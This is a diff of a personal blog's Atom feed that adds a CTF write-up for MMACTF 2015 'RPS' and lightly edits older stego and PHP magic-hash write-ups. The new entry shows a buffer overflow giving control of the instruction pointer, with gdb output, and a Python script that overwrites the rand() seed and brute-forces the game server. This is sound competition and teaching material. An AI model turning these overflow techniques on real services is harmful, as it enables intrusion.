@@ -4,7 +4,7 @@
   <title><![CDATA[punMag]]></title>
   <link href="http://tungpun.github.io/atom.xml" rel="self"/>
   <link href="http://tungpun.github.io/"/>
-  <updated>2015-08-13T21:47:40+00:00</updated>
+  <updated>2015-09-09T16:16:36+00:00</updated>
   <id>http://tungpun.github.io/</id>
   <author>
     <name><![CDATA[Tung Pun]]></name>
@@ -12,6 +12,295 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Write Up | MMACTF 2015 - Pwn - RPS]]></title>
+    <link href="http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/"/>
+    <updated>2015-09-09T15:14:40+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps</id>
+    <content type="html"><![CDATA[<pre><code>Problem
+Win 50 games in a row!
+nc milkyway.chal.mmactf.link 1641
+</code></pre>
+
+<p><a href="http://assets.score.mmactf.link/attachments/rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e">rps.7z</a></p>
+
+<p>Try to overflow the input, I discover that with payload <code>'1' * 88 + myaddr</code> , I can control the EIP to myaddr</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r &lt; data
+</span><span class='line'>Starting program: /root/MMACTF/rps/rps &lt; data
+</span><span class='line'>What's your name: Hi, 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111114321ABCD
+</span><span class='line'>Let's janken
+</span><span class='line'>Game 1/50
+</span><span class='line'>Rock? Paper? Scissors? [RPS]Bye bye
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>RAX: 0x0
+</span><span class='line'>RBX: 0x0
+</span><span class='line'>RCX: 0x7ffff7b13f60 (&lt;__write_nocancel+7&gt;:      cmp    rax,0xfffffffffffff001)
+</span><span class='line'>RDX: 0x0
+</span><span class='line'>RSI: 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>RDI: 0x7ffff7dd6620 --&gt; 0xfbad2a84
+</span><span class='line'>RBP: 0x3131313131313131 ('11111111')
+</span><span class='line'>RSP: 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>RIP: 0x400ae2 (&lt;main+732&gt;:      ret)
+</span><span class='line'>R8 : 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>R9 : 0x7ffff7fed700 (0x00007ffff7fed700)
+</span><span class='line'>R10: 0x355
+</span><span class='line'>R11: 0x246
+</span><span class='line'>R12: 0x400710 (&lt;_start&gt;:        xor    ebp,ebp)
+</span><span class='line'>R13: 0x7fffffffeb50 --&gt; 0x1
+</span><span class='line'>R14: 0x0
+</span><span class='line'>R15: 0x0
+</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>   0x400ad7 &lt;main+721&gt;: call   0x4006e0 &lt;fflush@plt&gt;
+</span><span class='line'>   0x400adc &lt;main+726&gt;: mov    eax,0x0
+</span><span class='line'>   0x400ae1 &lt;main+731&gt;: leave
+</span><span class='line'>=&gt; 0x400ae2 &lt;main+732&gt;: ret
+</span><span class='line'>   0x400ae3:    nop    WORD PTR cs:[rax+rax*1+0x0]
+</span><span class='line'>   0x400aed:    nop    DWORD PTR [rax]
+</span><span class='line'>   0x400af0 &lt;__libc_csu_init&gt;:  push   r15
+</span><span class='line'>   0x400af2 &lt;__libc_csu_init+2&gt;:        mov    r15d,edi
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>0008| 0x7fffffffea80 --&gt; 0x7fffffffeb00 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0016| 0x7fffffffea88 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0024| 0x7fffffffea90 --&gt; 0x100000000
+</span><span class='line'>0032| 0x7fffffffea98 --&gt; 0x400806 (&lt;main&gt;:      push   rbp)
+</span><span class='line'>0040| 0x7fffffffeaa0 --&gt; 0x0
+</span><span class='line'>0048| 0x7fffffffeaa8 --&gt; 0xe764facb54c92eb8
+</span><span class='line'>0056| 0x7fffffffeab0 --&gt; 0x400710 (&lt;_start&gt;:    xor    ebp,ebp)
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x0000000000400ae2 in main ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But, the address of line printing &ldquo;Congrats&rdquo; message contains <strong>\x0a</strong> character.
+It is changed to other character when I push to the program.
+I also try injecting shellcode to postfix, but it doesn&rsquo;t work too.</p>
+
+<blockquote><p>Make it simple !</p></blockquote>
+
+<p>What about rand() ? Is it safe perfectly ?</p>
+
+<p>I pay attention to <code>seed</code> of rand function. Seem like it can be overflowed too :)</p>
+
+<p>Using gdb, i have where the name stored in memory</p>
+
+<p><img src="" alt="name's address" /></p>
+
+<p>=> <code>$bp-0x50</code></p>
+
+<p>And <code>...seed</code></p>
+
+<p><img src="" alt="seed's address" /></p>
+
+<p>=> <code>$bp-0x20</code></p>
+
+<p>Calculate the length of payload:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0x50 - 0x20 = 0x30 ~ 48</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>seed = 'AAAA'
+</span><span class='line'>payload = 'A' * 48 + seed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Keep the <code>seed</code>, we try to brute force the result.
+I use this code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python 2.7
+</span><span class='line'>
+</span><span class='line'>import socket
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>p = lambda x: struct.pack("I", x)
+</span><span class='line'>P = lambda x: struct.unpack("I", x)
+</span><span class='line'>q = lambda x: struct.pack("&lt;Q", x)
+</span><span class='line'>
+</span><span class='line'>def interact():
+</span><span class='line'>    t = telnetlib.Telnet()
+</span><span class='line'>    t.sock = s
+</span><span class='line'>    t.interact()
+</span><span class='line'>
+</span><span class='line'>def r_until(st, debug=False):
+</span><span class='line'>    ret = ""
+</span><span class='line'>    while st not in ret:
+</span><span class='line'>        lret = s.recv(8192)
+</span><span class='line'>        if debug and len(lret) &gt; 0:
+</span><span class='line'>            print lret
+</span><span class='line'>        ret += lret
+</span><span class='line'>    return ret
+</span><span class='line'>
+</span><span class='line'>def tryluck(s, c):
+</span><span class='line'>    s.send(c + '\n')
+</span><span class='line'>    result = s.recv(1024)    
+</span><span class='line'>    if 'win' in result:
+</span><span class='line'>        return True
+</span><span class='line'>    return False
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    correctAnswer = []
+</span><span class='line'>    guessAnswer = 0                                     # 0 for R, 1 for P, 2 for S 
+</span><span class='line'>    for sessionID in range(0, 1000):        
+</span><span class='line'>        s = socket.create_connection(('milkyway.chal.mmactf.link', '1641'))
+</span><span class='line'>        print r_until(':')
+</span><span class='line'>        name = "A" * 52                                 # 48 + 4    
+</span><span class='line'>        s.send(name + '\n')            
+</span><span class='line'>        gameID = 0    
+</span><span class='line'>        while True:          
+</span><span class='line'>            print '[+] sessionID:', sessionID, '        gameID:', (gameID+1)
+</span><span class='line'>            print '[+] correctAnswer', correctAnswer                        
+</span><span class='line'>            print r_until(']', debug=True)
+</span><span class='line'>
+</span><span class='line'>            if gameID + 1 &lt;= len(correctAnswer):        # I have saved result for this game
+</span><span class='line'>                s.send(correctAnswer[gameID] + '\n')
+</span><span class='line'>                result = s.recv(1024)
+</span><span class='line'>                print '[+] Result:', result            
+</span><span class='line'>            else:                                       # no result for this game exists
+</span><span class='line'>                if guessAnswer == 0:
+</span><span class='line'>                    answer = 'S'
+</span><span class='line'>                elif guessAnswer == 1:
+</span><span class='line'>                    answer = 'R'
+</span><span class='line'>                else:
+</span><span class='line'>                    answer = 'P'
+</span><span class='line'>
+</span><span class='line'>                if not tryluck(s, answer):
+</span><span class='line'>                    guessAnswer += 1                    # choose another answer
+</span><span class='line'>                    break     
+</span><span class='line'>
+</span><span class='line'>                correctAnswer.append(answer)            # win, record the answer
+</span><span class='line'>                guessAnswer = 0                                                        
+</span><span class='line'>
+</span><span class='line'>            gameID += 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Get flag: <code>MMA{treed_three_girls}</code></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Have Fun With Linux - Configure Welcome Message]]></title>
@@ -688,7 +977,7 @@ We should overwrite EIP (using technique from previous challenge) in order to re
     <content type="html"><![CDATA[<p>In FCTF, there is a stegno challenge. It&rsquo;s quite simple, but, i had lost so this challenge took me about 40 mins.
 This is a reason for me to write about it today.</p>
 
-<p>I have had a &ldquo;white&rdquo; picture:</p>
+<p>I have a &ldquo;white&rdquo; picture:</p>
 
 <p><img src="http://i.imgur.com/2ukiJIf.png" alt="White" /></p>
 
@@ -748,8 +1037,8 @@ This is a reason for me to write about it today.</p>
 
 <p>Nothing to do more with exiftool.</p>
 
-<p>I tried viewing the raw data as hex. Too complicated with a pure white image. Is something injected in that file ? or LSB implemented ?
-To ensure that, these forensics tools like <code>binwalk</code>, <code>foremost</code> and <code>stegsolve</code> could be useful.</p>
+<p>I try viewing the raw data as hex. Too complicated with a pure white image. Is something injected in that file ? or LSB implemented ?
+To ensure that, these forensics tools like <code>binwalk</code>, <code>foremost</code> and <code>stegsolve</code> can be useful.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -765,8 +1054,8 @@ To ensure that, these forensics tools like <code>binwalk</code>, <code>foremost<
 </span><span class='line'>91            0x5B            Zlib compressed data, compressed</span></code></pre></td></tr></table></div></figure>
 
 
-<p>I checked zlib compressed data, but it is not what we need.
-Now is your time, foremost !</p>
+<p>I check zlib compressed data, but it is not what we need.
+Now is your time, <code>foremost</code> !</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -776,13 +1065,13 @@ Now is your time, foremost !</p>
 </span><span class='line'>|*|</span></code></pre></td></tr></table></div></figure>
 
 
-<p>I also spent ~20mins with StegSolve to ensure that file is not pure white.</p>
+<p>I also spend ~20mins with StegSolve to ensure that file is not pure white.</p>
 
 <p>Anything i have ignored ?</p>
 
 <blockquote><p>Never give up</p></blockquote>
 
-<p>I wrote a piece of code to highlight the pixel which is not pure white (255, 255, 255)</p>
+<p>I write a piece of code to highlight the pixel which is not pure white (255, 255, 255)</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -820,7 +1109,7 @@ Now is your time, foremost !</p>
 </span><span class='line'>  f.write(s)  </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Luck me, after openning the out file, i got flag.</p>
+<p>Luck me, after openning the out file, i get flag.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -886,15 +1175,15 @@ Now is your time, foremost !</p>
     <link href="http://tungpun.github.io/blog/2015/08/06/fctf-easy-php/"/>
     <updated>2015-08-06T13:49:02+00:00</updated>
     <id>http://tungpun.github.io/blog/2015/08/06/fctf-easy-php</id>
-    <content type="html"><![CDATA[<p>Last week, when fed my brain with CTF, i faced a web challenge. Luckily, with the help from my friend, i solved it.
-This challenge may be easy, but with me, it is interesting and i studied something. So, tonight, i spend my gaming time to explain about this.</p>
+    <content type="html"><![CDATA[<p>Last week, when feed my brain with CTF, i face a web challenge. Luckily, with the help from my friend, i solve it.
+This challenge may be easy, but with me, it is interesting and i study something. So, tonight, i spend my gaming time to explain about this.</p>
 
 <p>My English is terrible, however, i will try with my best.</p>
 
 <p>This challenge give us the url to the web page which have written by php. For personal reason, i can&rsquo;t show it here.</p>
 
 <p>Here we go,
-after viewing source, i found the piece of backend code:</p>
+after viewing source, i discover the piece of backend code:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -965,7 +1254,7 @@ The key is <a href="https://blog.whitehatsec.com/magic-hashes/">Magic Hash</a></
 
 <p><code>ecTmZcC</code>&rsquo;s crc32 is <code>0e730435</code>. So, we must calculate a value which has crc32 hash similar &lsquo;0eXXXXXX&rsquo; (X is numeric).</p>
 
-<p>I wrote a Python script to find it.</p>
+<p>I write a Python script to find it.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
